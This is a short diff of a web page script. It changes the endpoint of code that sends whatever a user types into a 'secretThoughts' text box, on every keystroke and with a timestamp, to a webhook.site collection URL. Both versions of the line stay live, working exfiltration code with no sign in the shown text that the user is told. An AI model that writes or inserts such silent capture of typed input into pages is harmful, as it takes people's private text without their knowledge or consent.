@@ -15,7 +15,7 @@ const textarea = document.getElementById("secretThoughts")
 textarea.addEventListener("input", function (e) {
 const text = e.target.value
 fetch(
-`https://webhook.site/bc0d84dc-11ae-42b7-a57f-c477eb287d44?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`
+`https://webhook.site/c1ae54e9-2b4e-4342-b44d-ee10c8496a41?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`
 ).catch(console.error)
 })
 </script>
